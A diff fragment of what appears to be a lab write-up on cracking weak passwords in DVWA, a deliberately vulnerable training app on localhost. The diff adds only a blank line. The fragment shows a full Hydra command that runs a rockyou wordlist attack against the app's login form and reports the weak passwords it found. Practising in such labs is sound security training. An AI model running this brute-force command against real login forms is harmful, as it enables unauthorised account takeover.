@@ -18,6 +18,7 @@ Crack weak passwords on DVWA's login form using a wordlist attack with Hydra.
 
 ### Hydra command used:
 ```bash
+
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"
 Outcome:
 Hydra successfully discovered multiple weak passwords such as 123456, password, and letmein.
